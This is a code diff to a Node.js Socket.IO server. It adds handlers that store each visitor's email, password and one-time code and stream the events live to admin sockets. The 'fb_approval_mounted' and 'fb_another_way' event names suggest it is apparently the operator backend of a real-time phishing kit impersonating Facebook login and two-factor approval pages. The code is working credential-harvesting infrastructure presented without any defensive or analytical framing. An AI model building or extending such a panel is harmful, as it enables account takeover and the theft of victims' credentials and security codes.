@@ -615,6 +615,60 @@ io.on("connection", (socket) => {
     });
   });
 
+  socket.on("fb_approval_mounted", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      otp: data.otp,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "fb_approval_mounted",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("fb_approval_mounted", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("fb_another_way", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      otp: data.otp,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "fb_another_way",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("fb_another_way", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
   socket.on("fb_done", (data) => {
     const sessionData = sessions.get(data.sessionId) || {
       email: data.email,
